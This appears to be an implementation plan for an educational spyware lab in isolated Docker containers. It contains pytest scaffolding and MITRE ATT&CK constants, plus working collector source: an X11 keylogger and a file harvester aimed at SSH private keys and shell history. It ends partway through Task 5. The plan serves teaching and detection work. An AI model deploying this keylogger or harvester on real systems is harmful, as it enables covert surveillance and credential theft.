# Foundation + Round 1 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Ship a working Round 1 lab end-to-end — the naïve spyware sample, its shared collector and HTTP-exfil modules, the Docker environment (victim, c2-server, analyst-ws), the R1 techlab and casefile materials (Polish), deterministic generators that produce the casefile artifacts, and the auto-graded R1 YARA deliverable — all wired through a single source of truth (`scenario_facts.py`) and covered by unit + integration tests.

**Architecture:** Vertical slice per round. This plan delivers R1 (naïve, plaintext HTTP, no evasion) as a complete learning experience. R2 (masquerading, HTTPS, memory forensics) and R3 (advanced, DNS tunneling, LD_PRELOAD, `libhide.so`) will be covered by follow-up plans that extend the same foundation. All scenario constants flow from `generators/data/scenario_facts.py`; all randomness seeds with `RANDOM_SEED = 42`; spyware samples share `collector.py` + `exfil_http.py` and differ only in OPSEC behavior. Directory names on disk follow the spec exactly (hyphenated: `core/spyware-samples/`, `module-techlab/`, `module-casefile/`, `round-1-naive/`). Python modules inside `shared/` are consumed either by sys-path injection (tests on the host) or by `PYTHONPATH=/opt/spyware/shared` (inside the victim container) — never by dotted package imports, since hyphenated directory names are not legal Python identifiers.

**Tech Stack:** Python 3.12, Ubuntu 24.04 (all images), Docker Compose v2 (profile `full`; `round3` profile reserved for a later plan), python-xlib + pynput (keylogger), requests (HTTP exfil), Flask (C2 receiver), scapy (pcap generation), yara-python (auto-grader), pytest (test runner with `docker` marker for Docker-gated tests). Participant-facing text in Polish; code, identifiers, and instructor-notes headings in English.

**Scope boundaries (this plan):**
- Foundation shared with R2/R3: `scenario_facts.py`, sample header convention, test scaffolding, `core/scenario/` narrative, `shared/collector.py`, `shared/exfil_http.py`, `module-techlab/docker-compose.yml` (base), victim + c2-server + analyst-ws images, generators skeleton.
- R1-specific: `round-1/spyware.py`, R1 MITRE allowlist population, R1 techlab `zadania.md` + `instructor-notes.md`, R1 casefile (pcap, process list, stolen-data JSON, auth.log, syslog, YARA corpus + `zadania.md`), R1 detection-rules grader.
- Explicitly out of scope (later plans): R2 sample + TLS + memory dumps + Sigma grader; R3 sample + `libhide.so` + DNS tunneling + `dns-server` service + Suricata grader + quantitative DNS notebook; scenarios for all rounds in casefile beyond R1.

---

## File Structure

```
ghost-in-the-box-lab/
├── pytest.ini                                      (NEW)
├── generators/
│   ├── __init__.py                                 (NEW)
│   ├── data/
│   │   ├── __init__.py                             (NEW)
│   │   └── scenario_facts.py                       (NEW — single source of truth)
│   ├── generate_pcap.py                            (NEW — R1 HTTP exfil pcap)
│   ├── generate_logs.py                            (NEW — R1 auth.log + syslog)
│   └── generate_artifacts.py                       (NEW — process list, stolen JSON)
├── core/
│   ├── scenario/
│   │   ├── briefing.md                             (NEW, Polish)
│   │   └── attacker-profile.md                     (NEW, Polish)
│   └── spyware-samples/
│       ├── requirements.txt                        (NEW — shared Python deps)
│       ├── shared/
│       │   ├── collector.py                        (NEW — keylog, file harvest, screenshot)
│       │   └── exfil_http.py                       (NEW — HTTP POST exfil)
│       └── round-1/
│           └── spyware.py                          (NEW — R1 orchestrator)
├── module-techlab/
│   ├── docker-compose.yml                          (NEW — ghost-net, profiles)
│   ├── .env.example                                (NEW — ROUND=1 default)
│   ├── victim/
│   │   ├── Dockerfile                              (NEW — Ubuntu 24 + Xvfb + scrot)
│   │   └── entrypoint.sh                           (NEW — starts Xvfb, runs sample)
│   ├── c2-server/
│   │   ├── Dockerfile                              (NEW)
│   │   ├── requirements.txt                        (NEW)
│   │   └── app.py                                  (NEW — HTTP receiver)
│   ├── analyst-ws/
│   │   └── Dockerfile                              (NEW — forensics toolset)
│   └── rounds/
│       └── round-1-naive/
│           ├── zadania.md                          (NEW, Polish)
│           └── instructor-notes.md                 (NEW — MITRE GT + answer key)
├── module-casefile/
│   └── round-1/
│       ├── network-capture.pcap                    (NEW, generated)
│       ├── process-list.txt                        (NEW, generated)
│       ├── stolen-data-sample.json                 (NEW, generated)
│       ├── auth.log                                (NEW, generated)
│       ├── syslog                                  (NEW, generated)
│       ├── yara-corpus/
│       │   ├── positive/spyware-r1.py              (NEW — copy of R1 sample)
│       │   ├── negative/benign-http-client.py      (NEW)
│       │   ├── negative/legit-monitor.py           (NEW)
│       │   └── negative/curl-example.sh            (NEW)
│       └── zadania.md                              (NEW, Polish)
└── tests/
    ├── __init__.py                                 (NEW)
    ├── conftest.py                                 (NEW — sys.path shim + fixtures)
    ├── test_scenario_facts.py                      (NEW)
    ├── test_spyware_samples.py                     (NEW)
    ├── test_mitre_mapping.py                       (NEW)
    ├── test_shared_modules.py                      (NEW — collector + exfil_http unit tests)
    ├── test_casefile_structure.py                  (NEW)
    ├── test_detection_rules.py                     (NEW)
    └── test_techlab_integration.py                 (NEW — Docker-gated, R1 only)
```

Files stay small and single-responsibility. `scenario_facts.py` only holds constants; `collector.py` has no networking; `exfil_http.py` has no collection; `spyware.py` orchestrates. Generators are one-per-output-type so failures isolate.

---

## Conventions used by this plan

1. **Tests precede code.** For every module we write, the test file (or a new test block in an existing file) lands first and must fail before implementation.
2. **Samples are scripts, not packages.** `core/spyware-samples/round-1/spyware.py` is executed inside the victim container with `PYTHONPATH=/opt/spyware/shared` and imports its deps as `import collector, exfil_http` — no dotted paths. Tests reach the same modules by inserting `core/spyware-samples/shared` into `sys.path` via `conftest.py`.
3. **Every path is explicit.** No "modify the relevant file"; each task names the file and the line range where it applies.
4. **Commits are small.** Typically one per task. The commit message matches conventional-commit style: `feat(scope)`, `test(scope)`, `chore(scope)`.
5. **Polish content is specified via detailed outline.** For `zadania.md`, `briefing.md`, etc., the plan gives section headings + bullet substance in Polish; the implementer fleshes bullets into prose. This is the one deliberate exception to the "no placeholders" rule — the alternative is committing long Polish paragraphs to a plan document, which would obscure rather than aid the implementer.

---

## Task Plan

### Task 1 — Foundation constants (`scenario_facts.py`)

**Files:**
- Create: `.gitignore`
- Create: `pytest.ini`
- Create: `generators/__init__.py`
- Create: `generators/data/__init__.py`
- Create: `generators/data/scenario_facts.py`
- Create: `tests/__init__.py`
- Create: `tests/test_scenario_facts.py`

- [ ] **Step 1: Write the failing test**

Create `.gitignore`:
```
.env
__pycache__/
*.pyc
*.pyo
.pytest_cache/
*.egg-info/
dist/
build/
.DS_Store
*.swp
*.swo
```

Create `pytest.ini`:
```ini
[pytest]
testpaths = tests
python_files = test_*.py
pythonpath = .
addopts = -ra --strict-markers
markers =
    docker: integration test requiring Docker (skipped if unavailable)
```

Create `tests/__init__.py` (empty).

Create `tests/test_scenario_facts.py`:
```python
"""Foundation constants must exist, be well-typed, and internally consistent."""
import ipaddress

from generators.data import scenario_facts as sf


def test_random_seed_is_42():
    assert sf.RANDOM_SEED == 42, "seed change invalidates every generated artifact"


def test_c2_ip_is_valid_private_ipv4():
    ip = ipaddress.IPv4Address(sf.C2_IP)
    assert ip.is_private
    assert sf.C2_IP == "10.13.37.1"


def test_c2_http_port_is_8080():
    assert sf.C2_HTTP_PORT == 8080


def test_c2_https_port_is_443():
    assert sf.C2_HTTPS_PORT == 443


def test_victim_identity():
    assert sf.VICTIM_USERNAME == "analyst"
    assert sf.VICTIM_HOSTNAME == "workstation-042"


def test_exfil_interval():
    assert sf.EXFIL_INTERVAL_SECONDS == 60
    assert isinstance(sf.EXFIL_INTERVAL_SECONDS, int)


def test_stolen_files_list():
    assert sf.STOLEN_FILES == [
        ".bash_history",
        ".ssh/id_rsa",
        "Documents/report-draft.txt",
    ]


def test_attacker_alias():
    assert sf.ATTACKER_ALIAS == "ghost"


def test_ghost_net_subnet_contains_c2_ip():
    net = ipaddress.IPv4Network(sf.GHOST_NET_SUBNET)
    assert ipaddress.IPv4Address(sf.C2_IP) in net
    gw = ipaddress.IPv4Address(sf.GHOST_NET_GATEWAY)
    assert gw in net and gw != ipaddress.IPv4Address(sf.C2_IP), (
        "gateway must not collide with C2 address"
    )


def test_mitre_allowlist_round_1_contents():
    r1 = sf.MITRE_ALLOWLIST[1]
    assert r1 == frozenset({"T1056.001", "T1113", "T1005", "T1071.001", "T1041"})


def test_mitre_allowlists_are_frozen():
    for tid_set in sf.MITRE_ALLOWLIST.values():
        assert isinstance(tid_set, frozenset)


def test_r1_excludes_advanced_techniques():
    r1 = sf.MITRE_ALLOWLIST[1]
    forbidden = {"T1574.006", "T1014", "T1071.004", "T1036.005", "T1573.002"}
    assert r1.isdisjoint(forbidden)
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_scenario_facts.py -v`
Expected: `ModuleNotFoundError: No module named 'generators'`.

- [ ] **Step 3: Implement `scenario_facts.py`**

Create `generators/__init__.py` (empty).
Create `generators/data/__init__.py` (empty).

Create `generators/data/scenario_facts.py`:
```python
"""Single source of truth for scenario constants.

Every IP, hostname, domain, username, interval, and path used in samples,
generators, Docker configs, and tests must be imported from here — never
hardcoded elsewhere. Extend this file (do not duplicate) as later rounds land.
"""
from __future__ import annotations

# Deterministic generation — every RNG in generators/ and tests/ seeds with this.
RANDOM_SEED: int = 42

# Isolated Docker network. Gateway at .254 so c2-server can claim .1.
GHOST_NET_SUBNET: str = "10.13.37.0/24"
GHOST_NET_GATEWAY: str = "10.13.37.254"

# C2 endpoint — same container, HTTP on R1, HTTPS on R2.
C2_IP: str = "10.13.37.1"
C2_HTTP_PORT: int = 8080
C2_HTTPS_PORT: int = 443

# Victim identity (stable across rounds so narrative holds).
VICTIM_USERNAME: str = "analyst"
VICTIM_HOSTNAME: str = "workstation-042"

# Exfil cadence in seconds.
EXFIL_INTERVAL_SECONDS: int = 60

# Files the spyware steals (relative to victim $HOME).
STOLEN_FILES: list[str] = [
    ".bash_history",
    ".ssh/id_rsa",
    "Documents/report-draft.txt",
]

# Narrative attacker identity (scenario docs only; never in samples).
ATTACKER_ALIAS: str = "ghost"

# Per-round MITRE ATT&CK allowlist. Each sample declares its TTPs in the
# mandatory header block; test_mitre_mapping.py enforces that declared IDs are
# a subset of the round's allowlist. frozenset so tests can't mutate by accident.
MITRE_ALLOWLIST: dict[int, frozenset[str]] = {
    1: frozenset({
        "T1056.001",  # Input Capture: Keylogging
        "T1113",      # Screen Capture
        "T1005",      # Data from Local System
        "T1071.001",  # Application Layer Protocol: Web
        "T1041",      # Exfiltration Over C2 Channel
    }),
    # R2 and R3 allowlists added by their respective plans.
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_scenario_facts.py -v`
Expected: 12 passed.

- [ ] **Step 5: Commit**

```bash
git add .gitignore pytest.ini generators/ tests/__init__.py tests/test_scenario_facts.py
git commit -m "feat(foundation): scenario_facts.py with R1 constants and MITRE allowlist"
```

---

### Task 2 — Sample header parser + `test_spyware_samples.py` skeleton

Header convention (from CLAUDE.md, section "Sample File Header"):
```
# GHOST-IN-THE-BOX LAB — EDUCATIONAL SAMPLE
# Round: X | Isolated Docker environment only
# For use in university cybersecurity courses
# MITRE ATT&CK: T1056.001, T1005, ...
```

The parser lives in `tests/conftest.py` so both `test_spyware_samples.py` and `test_mitre_mapping.py` consume it. `conftest.py` also injects `core/spyware-samples/shared` into `sys.path` so tests can import `collector` and `exfil_http` as top-level modules.

**Files:**
- Create: `tests/conftest.py`
- Create: `tests/test_spyware_samples.py`

- [ ] **Step 1: Write the failing test**

Create `tests/conftest.py`:
```python
"""Shared pytest fixtures, path shims, and sample-header parser.

Why the sys.path shim: core/spyware-samples/ has a hyphen, which is not a valid
Python package name. Samples (spyware.py) are executed inside the victim
container with PYTHONPATH=/opt/spyware/shared and import their shared deps as
`import collector` / `import exfil_http`. To exercise those same imports in
host-side unit tests, we inject the hyphenated shared/ directory into sys.path
here.
"""
from __future__ import annotations

import pathlib
import re
import sys
from dataclasses import dataclass

import pytest

REPO_ROOT = pathlib.Path(__file__).parent.parent
SAMPLES_ROOT = REPO_ROOT / "core" / "spyware-samples"
SHARED_DIR = SAMPLES_ROOT / "shared"

if SHARED_DIR.is_dir() and str(SHARED_DIR) not in sys.path:
    sys.path.insert(0, str(SHARED_DIR))


HEADER_LINE_LAB = re.compile(r"^#\s*GHOST-IN-THE-BOX LAB\s*—\s*EDUCATIONAL SAMPLE\s*$")
HEADER_LINE_SCOPE = re.compile(r"^#\s*Round:\s*(\d+)\s*\|\s*(.+)$")
HEADER_LINE_COURSE = re.compile(r"^#\s*For use in university cybersecurity courses\s*$")
HEADER_LINE_MITRE = re.compile(r"^#\s*MITRE ATT&CK:\s*(.+)$")
TTP_PATTERN = re.compile(r"T\d{4}(?:\.\d{3})?")


@dataclass(frozen=True)
class SampleHeader:
    source_path: pathlib.Path
    round: int
    scope_note: str
    mitre_ttps: frozenset[str]


def parse_header(source_path: pathlib.Path) -> SampleHeader:
    """Parse the required 4-line lab header; raise AssertionError on drift."""
    lines = source_path.read_text(encoding="utf-8").splitlines()
    if len(lines) < 4:
        raise AssertionError(f"{source_path}: fewer than 4 header lines")

    if not HEADER_LINE_LAB.match(lines[0]):
        raise AssertionError(f"{source_path}: line 1 does not match lab tag: {lines[0]!r}")
    m_scope = HEADER_LINE_SCOPE.match(lines[1])
    if not m_scope:
        raise AssertionError(f"{source_path}: line 2 does not match scope: {lines[1]!r}")
    if not HEADER_LINE_COURSE.match(lines[2]):
        raise AssertionError(f"{source_path}: line 3 does not match course line: {lines[2]!r}")
    m_mitre = HEADER_LINE_MITRE.match(lines[3])
    if not m_mitre:
        raise AssertionError(f"{source_path}: line 4 does not match MITRE line: {lines[3]!r}")

    ttps = frozenset(TTP_PATTERN.findall(m_mitre.group(1)))
    if not ttps:
        raise AssertionError(f"{source_path}: MITRE line present but no TTP IDs parsed")

    return SampleHeader(
        source_path=source_path,
        round=int(m_scope.group(1)),
        scope_note=m_scope.group(2).strip(),
        mitre_ttps=ttps,
    )


def collect_sample_paths() -> list[pathlib.Path]:
    """All round-*/spyware.py files under core/spyware-samples/."""
    return sorted(SAMPLES_ROOT.glob("round-*/spyware.py"))


@pytest.fixture
def parse_sample_header():
    """Fixture wrapping parse_header() so tests get it via dependency injection."""
    return parse_header
```

Create `tests/test_spyware_samples.py`:
```python
"""Every spyware sample must be valid Python and carry the mandatory lab header."""
import ast

import pytest

from tests.conftest import collect_sample_paths


@pytest.fixture(scope="module")
def sample_paths():
    paths = collect_sample_paths()
    if not paths:
        pytest.skip("no spyware samples on disk yet — tests turn green after Task 7")
    return paths


def test_at_least_one_sample_exists_after_round_1():
    # This will FAIL until Task 7 lands round-1/spyware.py. That is the desired state:
    # it is the canary ensuring R1 produced a sample file at the expected location.
    paths = collect_sample_paths()
    assert paths, "expected core/spyware-samples/round-*/spyware.py to exist"


def test_all_samples_are_parseable_python(sample_paths):
    for path in sample_paths:
        source = path.read_text(encoding="utf-8")
        ast.parse(source, filename=str(path))


def test_all_samples_have_valid_header(sample_paths, parse_sample_header):
    for path in sample_paths:
        header = parse_sample_header(path)
        assert header.round in (1, 2, 3)
        assert "docker" in header.scope_note.lower()
        assert len(header.mitre_ttps) >= 1
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_spyware_samples.py -v`
Expected: `test_at_least_one_sample_exists_after_round_1` FAILS (no samples yet); two parametrized tests SKIP ("no spyware samples on disk yet"). This is the intended red state.

- [ ] **Step 3: No implementation this task**

The parser and tests are in place. The red `test_at_least_one_sample_exists_after_round_1` is a sentinel — it turns green when Task 7 lands the R1 sample file.

- [ ] **Step 4: Confirm the import graph**

Run: `python -c "from tests.conftest import parse_header, collect_sample_paths, SAMPLES_ROOT; print(SAMPLES_ROOT.exists(), collect_sample_paths())"`
Expected: `False []` — the directory doesn't exist yet; no paths yet. Both are acceptable intermediate states.

- [ ] **Step 5: Commit (with red state noted in message)**

```bash
git add tests/conftest.py tests/test_spyware_samples.py
git commit -m "test(samples): header parser + sample structure tests (red until Task 7)"
```

---

### Task 3 — `test_mitre_mapping.py` — allowlist enforcement

**Files:**
- Create: `tests/test_mitre_mapping.py`

- [ ] **Step 1: Write the failing test**

Create `tests/test_mitre_mapping.py`:
```python
"""Each sample's declared MITRE TTPs must be a subset of its round's allowlist."""
import pytest

from generators.data import scenario_facts as sf
from tests.conftest import collect_sample_paths, parse_header


@pytest.fixture(scope="module")
def sample_paths():
    paths = collect_sample_paths()
    if not paths:
        pytest.skip("no samples yet — turns green at Task 7")
    return paths


def test_declared_ttps_are_subset_of_round_allowlist(sample_paths):
    failures = []
    for path in sample_paths:
        header = parse_header(path)
        if header.round not in sf.MITRE_ALLOWLIST:
            failures.append(f"{path}: round {header.round} has no allowlist entry")
            continue
        unexpected = header.mitre_ttps - sf.MITRE_ALLOWLIST[header.round]
        if unexpected:
            failures.append(
                f"{path}: declared TTPs {sorted(unexpected)} are not in "
                f"R{header.round} allowlist"
            )
    assert not failures, "\n".join(failures)


def test_sample_declares_at_least_three_ttps(sample_paths):
    undersized = []
    for path in sample_paths:
        header = parse_header(path)
        if len(header.mitre_ttps) < 3:
            undersized.append((path, sorted(header.mitre_ttps)))
    assert not undersized, (
        f"samples should exercise ≥3 techniques; undersized: {undersized}"
    )


def test_r1_sample_declares_expected_techniques_when_present(sample_paths):
    """When round-1/spyware.py exists, it must declare at least these core R1 TTPs."""
    import pathlib
    r1 = next(
        (p for p in sample_paths if p.parent.name == "round-1"),
        None,
    )
    if r1 is None:
        pytest.skip("round-1 sample not yet written")
    header = parse_header(r1)
    required = {"T1056.001", "T1005", "T1071.001", "T1041"}
    missing = required - header.mitre_ttps
    assert not missing, f"R1 sample missing required TTPs: {sorted(missing)}"
```

- [ ] **Step 2: Run test to verify it fails / skips cleanly**

Run: `pytest tests/test_mitre_mapping.py -v`
Expected: all tests SKIP (no samples yet). Acceptable intermediate state — turns green at Task 7.

- [ ] **Step 3: No implementation**

Consumer waits for producer (Task 7).

- [ ] **Step 4: Sanity-check imports**

Run: `python -c "from tests.conftest import parse_header; from generators.data.scenario_facts import MITRE_ALLOWLIST; print(sorted(MITRE_ALLOWLIST[1]))"`
Expected: `['T1005', 'T1041', 'T1056.001', 'T1071.001', 'T1113']`.

- [ ] **Step 5: Commit**

```bash
git add tests/test_mitre_mapping.py
git commit -m "test(mitre): enforce per-round TTP allowlist on sample headers"
```

---

### Task 4 — Shared collector: keylogger

Collector has three responsibilities: keystroke capture, file harvest, screenshot. The keylogger is the most complex of the three — split it off into its own task.

Spec mandate (design spec § Round 1): *"pure-Python loop reading X11 events via `Xlib` (from `Xvfb`); fallback branch using `pynput`"*. We expose a single `Keylogger` class with a tiny public surface: `start()`, `stop()`, `flush()`, attribute `buffer`, and class attribute `BACKEND_PREFERENCE`. The class auto-selects Xlib at construction; if `python-xlib` is not importable or `DISPLAY` is unset, it falls back to pynput. Unit tests exercise the buffer contract and a deterministic `_NullBackend` used when neither backend is available (test hosts without X); real X11 capture is exercised by the integration test (Task 17) under Xvfb.

**Files:**
- Create: `core/spyware-samples/shared/collector.py`
- Create: `core/spyware-samples/requirements.txt`
- Modify: `tests/test_spyware_samples.py` — append a section that imports the shared modules.
- Create: `tests/test_shared_modules.py` — unit tests for collector API.

- [ ] **Step 1: Write the failing test**

Create `tests/test_shared_modules.py`:
```python
"""Unit tests for core/spyware-samples/shared/ modules.

Imports rely on conftest.py inserting shared/ into sys.path.
"""
import os

import pytest


# --- Keylogger -------------------------------------------------------------

def test_collector_module_importable():
    import collector  # noqa: F401


def test_keylogger_has_public_surface():
    from collector import Keylogger

    assert hasattr(Keylogger, "BACKEND_PREFERENCE")
    assert Keylogger.BACKEND_PREFERENCE == ("xlib", "pynput")

    kl = Keylogger(backend="null")
    assert isinstance(kl.buffer, list)
    assert callable(kl.start)
    assert callable(kl.stop)
    assert callable(kl.flush)


def test_keylogger_null_backend_buffer_starts_empty():
    from collector import Keylogger
    kl = Keylogger(backend="null")
    assert kl.buffer == []


def test_keylogger_flush_returns_and_clears_buffer():
    from collector import Keylogger
    kl = Keylogger(backend="null")
    kl.buffer.extend(["a", "b", "c"])
    snapshot = kl.flush()
    assert snapshot == ["a", "b", "c"]
    assert kl.buffer == []


def test_keylogger_null_backend_start_stop_is_noop():
    from collector import Keylogger
    kl = Keylogger(backend="null")
    kl.start()
    kl.stop()
    assert kl.buffer == []


def test_keylogger_auto_falls_back_when_display_unset(monkeypatch):
    """Without DISPLAY and with forced xlib-missing, constructor picks pynput or null."""
    monkeypatch.delenv("DISPLAY", raising=False)
    from collector import Keylogger
    # Not asserting a specific backend — only that construction succeeds and the
    # selected backend is one of the allowed options.
    kl = Keylogger()
    assert kl.active_backend in {"xlib", "pynput", "null"}


def test_keylogger_raises_on_unknown_backend():
    from collector import Keylogger
    with pytest.raises(ValueError, match="unknown backend"):
        Keylogger(backend="telepathy")
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_shared_modules.py -v`
Expected: `ModuleNotFoundError: No module named 'collector'`.

- [ ] **Step 3: Implement keylogger**

Create `core/spyware-samples/requirements.txt`:
```
python-xlib==0.33
pynput==1.7.7
requests==2.32.3
```

Create `core/spyware-samples/shared/collector.py`:
```python
"""Collection primitives shared by all rounds.

Public API:
    Keylogger(backend=None)     — X11 keystroke capture
    harvest_files(home, rels)   — read files from the victim's home directory
    take_screenshot(path)       — invoke `scrot` against the current DISPLAY

No networking lives here; exfiltration modules (exfil_http.py, later exfil_dns.py)
consume these collectors' outputs.
"""
from __future__ import annotations

import os
import shutil
import subprocess
import threading
import time
from pathlib import Path
from typing import Iterable, Optional


class _NullBackend:
    """Inert backend used in unit tests and hosts without X11."""

    def __init__(self, buffer: list[str]) -> None:
        self._buffer = buffer
        self._running = False

    def start(self) -> None:
        self._running = True

    def stop(self) -> None:
        self._running = False


class _PynputBackend:
    """Fallback backend (spec: Xlib primary, pynput fallback)."""

    def __init__(self, buffer: list[str]) -> None:
        self._buffer = buffer
        self._listener = None

    def start(self) -> None:
        from pynput import keyboard  # imported lazily; may fail without X

        def _on_press(key):
            try:
                self._buffer.append(key.char if key.char else f"[{key.name}]")
            except AttributeError:
                self._buffer.append(f"[{key}]")

        self._listener = keyboard.Listener(on_press=_on_press)
        self._listener.daemon = True
        self._listener.start()

    def stop(self) -> None:
        if self._listener is not None:
            self._listener.stop()
            self._listener = None


class _XlibBackend:
    """Primary backend: python-xlib RECORD extension reading raw KeyPress events."""

    def __init__(self, buffer: list[str]) -> None:
        self._buffer = buffer
        self._local_dpy = None
        self._record_dpy = None
        self._ctx = None
        self._thread: Optional[threading.Thread] = None

    def start(self) -> None:
        from Xlib import display, X
        from Xlib.ext import record
        from Xlib.protocol import rq

        self._local_dpy = display.Display()
        self._record_dpy = display.Display()

        def _handler(reply):
            if reply.category != record.FromServer:
                return
            if reply.client_swapped:
                return
            if len(reply.data) < 2:
                return
            data = reply.data
            while len(data):
                event, data = rq.EventField(None).parse_binary_value(
                    data, self._record_dpy.display, None, None
                )
                if event.type == X.KeyPress:
                    keysym = self._local_dpy.keycode_to_keysym(event.detail, 0)
                    ch = chr(keysym) if 32 <= keysym < 127 else f"[ks:{keysym}]"
                    self._buffer.append(ch)

        self._ctx = self._record_dpy.record_create_context(
            0,
            [record.AllClients],
            [{
                "core_requests": (0, 0),
                "core_replies": (0, 0),
                "ext_requests": (0, 0, 0, 0),
                "ext_replies": (0, 0, 0, 0),
                "delivered_events": (0, 0),
                "device_events": (X.KeyPress, X.MotionNotify),
                "errors": (0, 0),
                "client_started": False,
                "client_died": False,
            }],
        )

        def _pump():
            self._record_dpy.record_enable_context(self._ctx, _handler)

        self._thread = threading.Thread(target=_pump, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        if self._ctx is not None and self._record_dpy is not None:
            self._record_dpy.record_disable_context(self._ctx)
            self._record_dpy.record_free_context(self._ctx)
            self._ctx = None


class Keylogger:
    """X11 keystroke capture.

    `backend`:
        None      — auto-detect (xlib → pynput → null)
        "xlib"    — force Xlib; raises if unavailable
        "pynput"  — force pynput; raises if unavailable
        "null"    — inert, for unit tests
    """

    BACKEND_PREFERENCE: tuple[str, ...] = ("xlib", "pynput")

    def __init__(self, backend: Optional[str] = None) -> None:
        self.buffer: list[str] = []
        self.active_backend: str = self._select_backend(backend)
        self._impl = self._build_impl(self.active_backend)

    def _select_backend(self, requested: Optional[str]) -> str:
        if requested == "null":
            return "null"
        if requested is not None and requested not in self.BACKEND_PREFERENCE:
            raise ValueError(f"unknown backend: {requested!r}")
        if requested == "xlib":
            return "xlib"
        if requested == "pynput":
            return "pynput"
        # Auto-detect.
        if self._xlib_usable():
            return "xlib"
        if self._pynput_usable():
            return "pynput"
        return "null"

    @staticmethod
    def _xlib_usable() -> bool:
        if not os.environ.get("DISPLAY"):
            return False
        try:
            import Xlib.display  # noqa: F401
            import Xlib.ext.record  # noqa: F401
        except Exception:
            return False
        return True

    @staticmethod
    def _pynput_usable() -> bool:
        try:
            from pynput import keyboard  # noqa: F401
        except Exception:
            return False
        return bool(os.environ.get("DISPLAY"))

    def _build_impl(self, name: str):
        if name == "xlib":
            return _XlibBackend(self.buffer)
        if name == "pynput":
            return _PynputBackend(self.buffer)
        return _NullBackend(self.buffer)

    def start(self) -> None:
        self._impl.start()

    def stop(self) -> None:
        self._impl.stop()

    def flush(self) -> list[str]:
        """Return a copy of the buffer and clear it."""
        snapshot = list(self.buffer)
        self.buffer.clear()
        return snapshot
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pip install python-xlib==0.33 pynput==1.7.7 && pytest tests/test_shared_modules.py -v`
Expected: 7 passed.

(If `pip install` is slow on a constrained host, use `--user` or a venv. A `requirements-dev.txt` will be introduced in Task 22 if needed.)

- [ ] **Step 5: Commit**

```bash
git add core/spyware-samples/shared/collector.py core/spyware-samples/requirements.txt tests/test_shared_modules.py
git commit -m "feat(collector): keylogger with Xlib-primary pynput-fallback backends"
```

---

### Task 5 — Shared collector: file harvest + screenshot

**Files:**
- Modify: `core/spyware-samples/shared/collector.py` — add two functions at end of file.
- Modify: `tests/test_shared_modules.py` — append file-harvest and screenshot tests.

- [ ] **Step 1: Write the failing test**

Append to `tests/test_shared_modules.py`:
```python
# --- File harvester --------------------------------------------------------

def test_harvest_files_reads_existing_files(tmp_path):
    from collector import harvest_files

    (tmp_path / ".bash_history").write_text("ls -la\ncat secret.txt\n")
    (tmp_path / "Documents").mkdir()
    (tmp_path / "Documents" / "report-draft.txt").write_text("Q4 draft")

    out = harvest_files(tmp_path, [".bash_history", "Documents/report-draft.txt"])

    assert out[".bash_history"] == "ls -la\ncat secret.txt\n"
    assert out["Documents/report-draft.txt"] == "Q4 draft"


def test_harvest_files_skips_missing_files_without_raising(tmp_path):
    from collector import harvest_files

    (tmp_path / ".bash_history").write_text("x")
    out = harvest_files(tmp_path, [".bash_history", ".ssh/id_rsa", "nonexistent"])

    assert ".bash_history" in out
    assert ".ssh/id_rsa" not in out
    assert "nonexistent" not in out


def test_harvest_files_returns_bytes_for_binary(tmp_path):
    from collector import harvest_files

    binary = bytes(range(256))
    (tmp_path / "blob.bin").write_bytes(binary)

    out = harvest_files(tmp_path, ["blob.bin"], binary=True)

    assert out["blob.bin"] == binary


# --- Screenshot -----------------------------------------------------------

def test_take_screenshot_returns_false_when_scrot_missing(tmp_path, monkeypatch):
    from collector import take_screenshot

    # Force which(scrot) -> None so we exercise the graceful-miss branch.
    monkeypatch.setattr("shutil.which", lambda name: None)
    out_path = tmp_path / "screen.png"
    ok = take_screenshot(out_path)
    assert ok is False
    assert not out_path.exists()


def test_take_screenshot_invokes_scrot_with_output_path(tmp_path, monkeypatch):
    from collector import take_screenshot

    calls = []

    def fake_which(name):
        return "/usr/bin/scrot" if name == "scrot" else None

    def fake_run(cmd, *a, **kw):
        calls.append(cmd)
        # Simulate scrot writing the file.
        output = cmd[-1]
        open(output, "wb").write(b"\x89PNG\r\n\x1a\n")

        class _R:
            returncode = 0
        return _R()

    monkeypatch.setattr("shutil.which", fake_which)
    monkeypatch.setattr("subprocess.run", fake_run)

    out_path = tmp_path / "screen.png"
    ok = take_screenshot(out_path)
    assert ok is True
    assert calls == [["/usr/bin/scrot", "--overwrite", str(out_path)]]
    assert out_path.exists()
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_shared_modules.py -v -k "harvest or screenshot"`
Expected: `ImportError: cannot import name 'harvest_files' from 'collector'` (and same for `take_screenshot`).

- [ ] **Step 3: Extend `collector.py`**

Append to `core/spyware-samples/shared/collector.py`:
```python
# --- File harvest ---------------------------------------------------------

def harvest_files(home: Path, relative_paths: Iterable[str], *, binary: bool = False) -> dict:
    """Read a set of files under ``home`` and return a {rel_path: contents} map.

    Missing files are silently skipped — the attacker does not crash if a target
    does not exist on a given host, because an unhandled exception would generate
    a stack trace in the victim's terminal and blow OPSEC. This forgiving-by-default
    behavior is itself part of the R1 teaching point: the sample is clearly *trying*
    to be quiet even though everything else about it screams.
    """
    out: dict = {}
    home = Path(home)
    for rel in relative_paths:
        src = home / rel
        if not src.is_file():
            continue
        try:
            if binary:
                out[rel] = src.read_bytes()
            else:
                out[rel] = src.read_text(encoding="utf-8", errors="replace")
        except OSError:
            # Permission denied / I/O error — skip, do not propagate.
            continue
    return out


# --- Screenshot -----------------------------------------------------------

def take_screenshot(output_path: Path) -> bool:
    """Invoke `scrot` to save a PNG at ``output_path``. Return True on success.

    Returns False (not raising) when `scrot` is not installed or the invocation
    fails — consistent with the forgiving-by-default harvest behavior above.
    """
    scrot = shutil.which("scrot")
    if scrot is None:
        return False
    result = subprocess.run(
        [scrot, "--overwrite", str(output_path)],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    return result.returncode == 0
```

- [ ] **Step 4: Run tests**

Run: `pytest tests/test_shared_modules.py -v`
Expected: 10 passed (previous 7 + new 3 + harvest/screenshot interaction).

